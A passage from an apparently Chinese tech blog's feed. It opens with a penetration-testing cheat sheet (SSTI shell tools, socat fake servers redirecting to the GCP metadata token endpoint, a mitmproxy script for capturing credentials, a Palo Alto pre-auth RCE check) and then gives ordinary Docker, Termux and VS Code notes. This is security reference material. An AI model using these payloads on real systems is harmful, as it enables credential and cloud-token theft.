servers’ internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.</p><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br><br># Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.<br><br><code>tplmap.py --os-shell -u 'http://www.example.com/page?name=John'</code></p><p><a href="https://github.com/vladko312/SSTImap">https://github.com/vladko312/SSTImap</a><br><br># SSTImap is a penetration testing software that can check websites for Code Injection and Server-Side Template Injection vulnerabilities and exploit them, giving access to the operating system itself.<br><br><code>sstimap.py -u https://example.com/page?name=John</code></p><h3 id="Information-Disclosure">Information Disclosure</h3><p><a href="https://infosecwriteups.com/information-disclosure-vulnerability-in-adobe-experience-manager-affecting-multiple-companies-2fb0558cd957">https://infosecwriteups.com/information-disclosure-vulnerability-in-adobe-experience-manager-affecting-multiple-companies-2fb0558cd957</a><br><br><code>https://www.example.com/content/example/filename.pdf/.1.json</code></p><h3 id="WebDAV-Web-Distributed-Authoring-and-Versioning">WebDAV (Web Distributed Authoring and Versioning)</h3><p><a href="http://www.webdav.org/cadaver/">http://www.webdav.org/cadaver/</a><br><br># cadaver is a command-line WebDAV client for Unix.</p><p><a href="https://github.com/cldrn/davtest">https://github.com/cldrn/davtest</a><br><br># This program attempts to exploit WebDAV enabled servers.</p><h3 id="Generic-Tools">Generic Tools</h3><p><a href="https://ahrefs.com/backlink-checker">https://ahrefs.com/backlink-checker</a><br><br># Try the free version of Ahrefs’ Backlink Checker.</p><p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><br><br># The Cyber Swiss Army Knife</p><p><a href="https://github.com/securisec/chepy">https://github.com/securisec/chepy</a><br><br># Chepy is a python lib/cli equivalent of the awesome CyberChef tool.</p><p><a href="https://packettotal.com/">https://packettotal.com/</a><br><br># Pcap analysis and samples</p><p><a href="https://github.com/vavkamil/awesome-bugbounty-tools">https://github.com/vavkamil/awesome-bugbounty-tools</a><br><br># A curated list of various bug bounty tools.</p><p><a href="https://check-host.net/">https://check-host.net/</a><br><br># Check-Host is a modern online tool for website monitoring and checking availability of hosts, DNS records, IP addresses.</p><p><a href="https://github.com/fyoorer/ShadowClone">https://github.com/fyoorer/ShadowClone</a><br><br># ShadowClone allows you to distribute your long running tasks dynamically across thousands of serverless functions and gives you the results within seconds where it would have taken hours to complete.</p><p><a href="https://github.com/A-poc/RedTeam-Tools">https://github.com/A-poc/RedTeam-Tools</a><br><br># This github repository contains a collection of 125+ tools and resources that can be useful for red teaming activities.</p><p><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md</a><br><br># All Atomic Tests by ATT&amp;CK Tactic &amp; Technique (<a href="https://atomicredteam.io/atomics/">https://atomicredteam.io/atomics/</a>).</p><p><a href="https://github.com/fransr/unpack-burp">https://github.com/fransr/unpack-burp</a><br><br># This is a small tool created by Frans Rosén. For unpacking base64:ed “Save items”-content from Burp.</p><p><a href="https://github.com/codingo/Interlace">https://github.com/codingo/Interlace</a><br><br># Easily turn single threaded command line applications into a fast, multi-threaded application with CIDR and glob support.</p><h2 id="General-3">General</h2><p><br># Print only response headers for any method with curl<br><br><code>curl -skSL -D - https://www.example.com -o /dev/null</code></p><p><br># Extract website certificate<br><br><code>true | openssl s_client -connect www.example.com:443 2&gt;/dev/null | openssl x509 -noout -text</code></p><p><br># Pure bash multhread script</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FILE=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line">THREADS=<span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span></span><br><span class="line">TIMEOUT=<span class="string">&quot;<span class="variable">$&#123;3&#125;</span>&quot;</span></span><br><span class="line">CMD=<span class="string">&quot;<span class="variable">$&#123;4&#125;</span>&quot;</span></span><br><span class="line">NUM=$(<span class="built_in">wc</span> -l <span class="variable">$&#123;FILE&#125;</span> | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span>)</span><br><span class="line">THREAD=0</span><br><span class="line">NUMDOM=0</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> SUBDOMAIN; <span class="keyword">do</span></span><br><span class="line">        PIDSTAT=0</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$THREAD</span> -lt <span class="variable">$THREADS</span> ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">eval</span> <span class="built_in">timeout</span> <span class="variable">$&#123;TIMEOUT&#125;</span> <span class="variable">$&#123;CMD&#125;</span> 2&gt;/dev/null &amp;</span><br><span class="line">                PIDS[<span class="variable">$THREAD</span>]=<span class="string">&quot;<span class="variable">$&#123;!&#125;</span>&quot;</span></span><br><span class="line">                <span class="built_in">let</span> THREAD++</span><br><span class="line">                <span class="built_in">let</span> NUMDOM++</span><br><span class="line">                <span class="built_in">echo</span> -ne <span class="string">&quot;\r&gt;Progress: <span class="variable">$&#123;NUMDOM&#125;</span> of <span class="variable">$&#123;NUM&#125;</span> (<span class="subst">$(awk <span class="string">&quot;BEGIN &#123;printf \&quot;%0.2f\&quot;,(<span class="variable">$&#123;NUMDOM&#125;</span>*100)/<span class="variable">$&#123;NUM&#125;</span>&#125;&quot;</span>)</span>%)\r&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">while</span> [ <span class="variable">$&#123;PIDSTAT&#125;</span> -eq 0 ]; <span class="keyword">do</span></span><br><span class="line">                        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!PIDS[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">                                <span class="built_in">kill</span> -0 <span class="string">&quot;<span class="variable">$&#123;PIDS[j]&#125;</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">                                PIDSTAT=<span class="string">&quot;<span class="variable">$&#123;?&#125;</span>&quot;</span></span><br><span class="line">                                <span class="keyword">if</span> [ <span class="variable">$&#123;PIDSTAT&#125;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">                                        <span class="built_in">eval</span> <span class="built_in">timeout</span> <span class="variable">$&#123;TIMEOUT&#125;</span> <span class="variable">$&#123;CMD&#125;</span> 2&gt;/dev/null &amp;</span><br><span class="line">                                        PIDS[j]=<span class="string">&quot;<span class="variable">$&#123;!&#125;</span>&quot;</span></span><br><span class="line">                                        <span class="built_in">let</span> NUMDOM++</span><br><span class="line">                                        <span class="built_in">echo</span> -ne <span class="string">&quot;\r&gt;Progress: <span class="variable">$&#123;NUMDOM&#125;</span> of <span class="variable">$&#123;NUM&#125;</span> (<span class="subst">$(awk <span class="string">&quot;BEGIN &#123;printf \&quot;%0.2f\&quot;,(<span class="variable">$&#123;NUMDOM&#125;</span>*100)/<span class="variable">$&#123;NUM&#125;</span>&#125;&quot;</span>)</span>%)\r&quot;</span></span><br><span class="line">                                        <span class="built_in">break</span></span><br><span class="line">                                <span class="keyword">fi</span></span><br><span class="line">                        <span class="keyword">done</span></span><br><span class="line">                <span class="keyword">done</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="variable">$&#123;FILE&#125;</span></span><br><span class="line"><span class="built_in">wait</span></span><br></pre></td></tr></table></figure><p><br># Reverse Proxy (mitmproxy)<br><br><code>mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/</code> # Good for capture credentials</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat script.py</span><br><span class="line"><span class="keyword">import</span> mitmproxy.http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"></span><br><span class="line">def request(flow):</span><br><span class="line">    <span class="keyword">if</span> flow.request.<span class="keyword">method</span> == &quot;POST&quot;:</span><br><span class="line">        ctx.<span class="keyword">log</span>.<span class="keyword">info</span>(flow.request.get_text())</span><br><span class="line">        f = <span class="keyword">open</span>(&quot;captured.log&quot;, &quot;a&quot;)</span><br><span class="line">        f.<span class="keyword">write</span>(flow.request.get_text() + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><br># Port Forwarding (socat)<br><br><code>sudo socat -v TCP-LISTEN:80,fork TCP:127.0.0.1:81</code></p><p><br># Reverse Proxy (socat)<br><br><code>socat -v -d -d TCP-LISTEN:8101,reuseaddr,fork TCP:127.0.0.1:8100</code><br><br><code>sudo socat -v -d -d openssl-listen:8443,cert=cert.pem,reuseaddr,fork,verify=0 SSL:127.0.0.1:443,verify=0</code></p><p><br># SOCKS Proxy<br><br><code>ssh -N -D 0.0.0.0:1337 localhost</code></p><p><a href="https://github.com/projectdiscovery/proxify/">https://github.com/projectdiscovery/proxify/</a><br><br># Swiss Army Knife Proxy for rapid deployments. Supports multiple operations such as request/response dump, filtering and manipulation via DSL language, upstream HTTP/Socks5 proxy.<br><br><code>proxify -socks5-proxy socks5://127.0.0.1:9050</code></p><p><br># Fake HTTP Server<br><br><code>while true ; do echo -e &quot;HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 2\r\n\r\nOK&quot; | sudo nc -vlp 80; done</code><br><br><code>socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 200 OK&quot;;/bin/echo &quot;Connection: close&quot;;/bin/echo &quot;Content-Length: 2&quot;;/bin/echo;/bin/echo &quot;OK&quot;'</code><br><br><code>socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 302 Found&quot;;/bin/echo &quot;Content-Length: 0&quot;;/bin/echo &quot;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot;;/bin/echo;/bin/echo'</code><br><br><code>FILE=image.jpg;socat -v -d -d TCP-LISTEN:80,fork &quot;SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c&lt;$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo;dd 2&gt;/dev/null&lt;$FILE&quot;</code> # Present an image<br><br><code>python2 -m SimpleHTTPServer 8080</code><br><br><code>python3 -m http.server 8080</code><br><br><code>php -S 0.0.0.0:80</code><br><br><code>ruby -run -e httpd . -p 80</code><br><br><code>busybox httpd -f -p 80</code></p><p><br># Fake HTTPS Server<br><br><code>openssl req -new -x509 -keyout test.key -out test.crt -nodes</code><br><br><code>cat test.key test.crt &gt; test.pem</code><br><br><code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 200 OK&quot;;/bin/echo &quot;Connection: close&quot;;/bin/echo &quot;Content-Length: 2&quot;;/bin/echo;/bin/echo &quot;OK&quot;'</code><br><br><code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 302 Found&quot;;/bin/echo &quot;Connection: close&quot;;/bin/echo &quot;Content-Length: 0&quot;;/bin/echo &quot;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot;;/bin/echo;/bin/echo'</code><br><br><code>stunnel stunnel.conf</code> # Check <a href="https://www.stunnel.org/">https://www.stunnel.org/</a></p><p><br># Python 3 Simple HTTPS Server</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import http<span class="selector-class">.server</span>, ssl</span><br><span class="line">server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">443</span>)</span><br><span class="line">httpd = http<span class="selector-class">.server</span><span class="selector-class">.HTTPServer</span>(server_address, http<span class="selector-class">.server</span>.SimpleHTTPRequestHandler)</span><br><span class="line">httpd<span class="selector-class">.socket</span> = ssl<span class="selector-class">.wrap_socket</span>(httpd<span class="selector-class">.socket</span>, server_side=True, certfile=<span class="string">&#x27;/path/cert.pem&#x27;</span>, ssl_version=ssl.PROTOCOL_TLS)</span><br><span class="line">httpd<span class="selector-class">.serve_forever</span>()</span><br></pre></td></tr></table></figure><p><br># Fake FTP Server<br><br><code>python -m pyftpdlib --directory=/tmp/dir/ --port=21</code></p><p><br># Check HTTP or HTTPS<br><br><code>while read i; do curl -m 15 -ki http://$i &amp;&gt; /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done &lt; subdomains.txt</code><br><br><code>while read i; do curl -m 15 -ki https://$i &amp;&gt; /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done &lt; subdomains.txt</code></p><p><br># Ten requests in parallel<br><br><code>xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com &lt; &lt;(printf '%s\n' &#123;1..10000&#125;)</code></p><p><br># Access target directly through IP address<br><br><code>http://1.2.3.4</code><br><br><code>https://1.2.3.4</code></p><p><br># Trim space and newlines on bash variable<br><br><code>&quot;$&#123;i//[$'\t\r\n ']&#125;&quot;</code></p><p><br># Extract paths from swagger.json<br><br><code>cat swagger.json | jq -r '.paths | to_entries[] | .key'</code></p><p><br># Free SMS online services<br><br><a href="https://receive-sms.cc">https://receive-sms.cc</a><br><br><a href="https://onlinesim.io">https://onlinesim.io</a></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br><br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.</p><p><a href="https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/">https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/</a><br><br># Make Offline Mirror of a Site using wget<br><br><code>wget -mkEpnp https://www.example.com/</code></p><p><br># Referer spoofing<br><br><code>&lt;base href=&quot;https://www.google.com/&quot;&gt;</code><br><br><code>&lt;style&gt;</code><br><br><code>@import 'https://CSRF.vulnerable.example/';</code><br><br><code>&lt;/style&gt;</code></p><p><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a><br><br># Check PreAuth RCE on Palo Alto GlobalProtect<br><br><code>time curl -s -d 'scep-profile-name=%9999999c' https://$&#123;HOST&#125;/sslmgr &gt;/dev/null</code><br><br><code>time curl -s -d 'scep-profile-name=%99999999c' https://$&#123;HOST&#125;/sslmgr &gt;/dev/null</code><br><br><code>time curl -s -d 'scep-profile-name=%999999999c' https://$&#123;HOST&#125;/sslmgr &gt;/dev/null</code></p><p><a href="https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html">https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html</a><br><br># How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System (bypass with /…;/)</p><p><a href="https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/">https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/</a><br><br># Routing To Another Backend , Deserve Spending Hours AND Hours On Its So Inspired By @samwcyo’s Talk &quot; Attacking Secondary Contexts in Web Applications &quot; , I Have Been Collecting A Lot Of Stuff To PWN This Backend.</p><p><a href="https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b">https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b</a><br><br># This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.</p><p><a href="https://github.com/shieldfy/API-Security-Checklist">https://github.com/shieldfy/API-Security-Checklist</a><br><br># Checklist of the most important security countermeasures when designing, testing, and releasing your API.</p><p><a href="https://ippsec.rocks">https://ippsec.rocks</a><br><br># Looking for a video on a specific hacking technique/tool? Searches over 100 hours of my videos to find you the exact spot in the video you are looking for.</p><p><a href="https://book.hacktricks.xyz/welcome/hacktricks">https://book.hacktricks.xyz/welcome/hacktricks</a><br><br># Welcome to the page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news.</p><p><a href="https://github.com/c3l3si4n/godeclutter">https://github.com/c3l3si4n/godeclutter</a><br><br># Declutters URLs in a lightning fast and flexible way, for improving input for web hacking automations such as crawlers and vulnerability scans.</p><p><a href="https://github.com/s0md3v/uro">https://github.com/s0md3v/uro</a><br><br># Using a URL list for security testing can be painful as there are a lot of URLs that have uninteresting/duplicate content; uro aims to solve that.</p><p><a href="https://github.com/hakluke/hakscale">https://github.com/hakluke/hakscale</a><br><br># Hakscale allows you to scale out shell commands over multiple systems with multiple threads on each system. The key concept is that a master server will push commands to the queue, then multiple worker servers pop commands from the queue and execute them. The output from those commands will then be sent back to the master server.<br><br><code>hakscale push -p &quot;host:./hosts.txt&quot; -c &quot;echo _host_ | httpx&quot; -t 20</code></p><p><a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a><br><br># In this writeup, I will be covering techniques which can be used to influence web systems and applications in unexpected ways, by abusing HTTP/1.1 hop-by-hop headers. Systems affected by these techniques are likely ones with multiple caches/proxies handling requests before reaching the backend application.</p><p><a href="https://github.com/chubin/cheat.sh">https://github.com/chubin/cheat.sh</a><br><br># Unified access to the best community driven cheat sheets repositories of the world.</p><p><a href="https://labs.detectify.com/2022/10/28/hacking-supercharged-how-to-gunnar-andrews/">https://labs.detectify.com/2022/10/28/hacking-supercharged-how-to-gunnar-andrews/</a><br><br># How to supercharge your hacking: Mindset, workflow, productivity and checklist.</p><p><a href="https://github.com/sehno/Bug-bounty">https://github.com/sehno/Bug-bounty</a><br><br># You can find here some resources I use to do bug bounty hunting.</p><p><a href="https://wpdemo.net/">https://wpdemo.net/</a><br><br># <a href="http://WPDemo.net">WPDemo.net</a> is for WordPress theme designers and plugin developers that want to allow potential customers to test drive their WordPress plugins or themes before buying.</p><p><a href="https://searchcode.com/">https://searchcode.com/</a><br><br># Search 75 billion lines of code from 40 million projects.</p><p><a href="https://github.com/vitalysim/Awesome-Hacking-Resources">https://github.com/vitalysim/Awesome-Hacking-Resources</a><br><br># A collection of hacking / penetration testing resources to make you better!</p><p><a href="https://github.com/infoslack/awesome-web-hacking">https://github.com/infoslack/awesome-web-hacking</a><br><br># A list of web application security.</p><p><a href="https://www.youtube.com/watch?v=QSq-aYYQpro">https://www.youtube.com/watch?v=QSq-aYYQpro</a><br><br># Command-Line Data-Wrangling by Tomnomnom.</p><p><a href="https://www.youtube.com/watch?v=s9w0KutMorE">https://www.youtube.com/watch?v=s9w0KutMorE</a><br><br># Bug Bounties With Bash by Tomnomnom.</p><p><a href="https://github.com/qmacro/teched-jq-talk">https://github.com/qmacro/teched-jq-talk</a><br><br># These are the notes and code snippets relating to a Community Talk at SAP TechEd 2023 in Bengaluru: Handle JSON like a boss with jq.</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Termux安卓机实现内网穿透</title>
      <link href="/posts/91facb7b.html"/>
      <url>/posts/91facb7b.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.cpolar.com/blog/public-ssh-remote-connection-to-termux-using-android-termux-cpolar-internal-network-penetration">内网穿透教程1</a></p></blockquote><blockquote><p><a href="https://www.linuxhe.com/1380.html">内网穿透教程2</a></p></blockquote><p><a href="https://blog.csdn.net/xianyun_0355/article/details/134207599">cpolar实现对termux内网穿透</a></p><p><code>ssh u0_a113</code></p><p>需要注意的问题：</p><ol><li><p>Termux的默认ssh端口为：<code>9022</code>，而非<code>22</code></p></li><li><p>如果你已root,那么可以通过安装一个linux,且可以使用超级管理员权限,更爽,但是没root也不妨碍正常使用就是了</p></li><li><p>控制手机杀后台的问题,一定一定不能把后台杀了</p></li><li><p>ssh内网穿透后尽量不要将重要的信息上传到Termux中,做做小测试平台还行,安全意识还得有</p></li><li><p>渗透工具安装都基本被Termux官方杀了,因此别想了~很难装,我装个kali都费劲</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 骚操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode 提交git一直卡着转圈圈</title>
      <link href="/posts/38f255c6.html"/>
      <url>/posts/38f255c6.html</url>
      
        <content type="html"><![CDATA[<p><strong>打开设置<br>把use Editor As commit input的勾选框去掉，ok，重新提交就可以了 。在commit却不添加任何消息时，勾选了这个会默认生成一个文件来替代消息并提交，而服务器无法接受这样的消息</strong><br><img src="https://s1.vika.cn/space/2024/03/28/d6d3efc6e6ae469194bb020bd3848e80" alt=""></p><p>取消勾选后重启<br><img src="https://s1.vika.cn/space/2024/03/28/c1be662048a4472aa0cf7e8fec7b5cdb" alt=""><br>成功!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker6</title>
      <link href="/posts/b52df0be.html"/>
      <url>/posts/b52df0be.html</url>
      
        <content type="html"><![CDATA[<h3 id="初始Dockerfile">初始Dockerfile</h3><p>Dockerfile 就是用来构建 docker 镜像的构建文件! 即包含一段命令脚本</p><blockquote><p><em>vim doc1</em></p><p>写入以下内容:</p><p><code>1   FROM centos                                                                    1 VOLUME [&quot;volume01&quot;],[&quot;volume02&quot;]                                               2 CMD echo &quot;------END-----&quot;   3 CMD /bin/bash</code></p><p>docker images</p><p>再次查看发现成功<strong>commit</strong></p></blockquote><h3 id="容器间的数据共享">容器间的数据共享</h3><p>我们可以从上一节我们自己生成的docker 镜像启动一个docker01的容器,再从docker01继承得到docker02docker03…</p><p>这样他们之间的数据会保持同步,修改一直.</p><p>生命周期一直持续到没有容器继续使用为止!</p><p><img src="https://s1.vika.cn/space/2024/03/29/b12788d998be4c53ace2a8a34bcdac1b" alt=""></p><p><code>这样的共享关系其实也是备份关系</code>,即父容器不存在或者受影响了.子容器中也会存在原有的数据</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker4</title>
      <link href="/posts/5b239192.html"/>
      <url>/posts/5b239192.html</url>
      
        <content type="html"><![CDATA[<h3 id="容器数据卷">容器数据卷</h3><hr><p>什么是容器数据卷 ?</p><p>将应用和环境打包成一个镜像.</p><p>如果数据都在容器中,我们删除容器后,数据就会丢失?</p><p>需求:数据可以持久化. Mysql 数据存储在本地!</p><p>容器之间可以有一个数据共享的技术,Docker容器中产生的数据,同步到本地就是卷技术,将我们容器的目录挂在到linux上面!</p><p><img src="https://s1.vika.cn/space/2024/03/28/2859a09acc424db4951b6786499cff0b" alt=""></p><p><strong>容器的持久化和同步操作,同时容器间也可以数据共享的!</strong></p><h3 id="使用数据卷">使用数据卷</h3><blockquote><p>方式一: 直接使用命令进行挂载 -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器目录</span><br><span class="line">实例: docker run -it -v /home/eviden:/home centos /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看容器信息</span></span><br><span class="line">docker inspect +id </span><br><span class="line">找到`Mounts`那一栏可以看到具体挂载信息</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2024/03/28/49c605e356c54bc883d8b570e6283c84" alt=""></p><h3 id="实战-安装Mysql">实战,安装Mysql</h3><p><img src="https://s1.vika.cn/space/2024/03/28/6be40ecaee2d4a8db8a99fdd5559c3cd" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker05</title>
      <link href="/posts/fe873f53.html"/>
      <url>/posts/fe873f53.html</url>
      
        <content type="html"><![CDATA[<h3 id="具名挂载和匿名挂载">具名挂载和匿名挂载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">匿名挂载</span></span><br><span class="line">- +容器内路径!</span><br><span class="line">docker run -d -p --name -nginx01 -v /etc/nginx nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有的olume 的情况</span></span><br><span class="line">docker volume ls </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里发现是匿名挂载,显示的挂载<span class="built_in">id</span>为一串随机数码,因为我们在-v 只写了容器内的路径,而没有写容器外的路径! 相当于是docker 给我们挂载到宿主机中一个默认的位置并且给了个默认的随机<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">具名挂载</span></span><br><span class="line">docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看</span></span><br><span class="line">docker volume ls </span><br><span class="line">发现挂载名字为`juming-nginx`</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2024/03/29/08d1ea3539c44a018609113082a055d5" alt=""></p><p><img src="https://s1.vika.cn/space/2024/03/29/e7e5547e3fc74a0b80c65763edc360ea" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker3</title>
      <link href="/posts/c5470431.html"/>
      <url>/posts/c5470431.html</url>
      
        <content type="html"><![CDATA[<h3 id="Commit-镜像">Commit 镜像</h3><blockquote><p>如何提交自己的一个镜像?</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker commit #提交容器为一个新的副本</span><br><span class="line">docker comit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[TAG]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拿默认的tomcat应用举例,因为其默认应用没有apps应用,因此不可以直接运行</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">每次运行时都得手动拷贝,maybe这和一些系统镜像类似</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开头都是一些白纸,得你手动加一些什么工具之后用起来才更好</span></span><br></pre></td></tr></table></figure><blockquote><p>如果你想保存当前容器的状态(或者你自己自定义的一些功能?) ,就可以通过commit来提交,或者一个新的镜像(保存你此时容器的配置,以后再次启动时便可以直接恢复到该状态)就好比以前我们学习VM的时候的快照.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker2</title>
      <link href="/posts/b24034a7.html"/>
      <url>/posts/b24034a7.html</url>
      
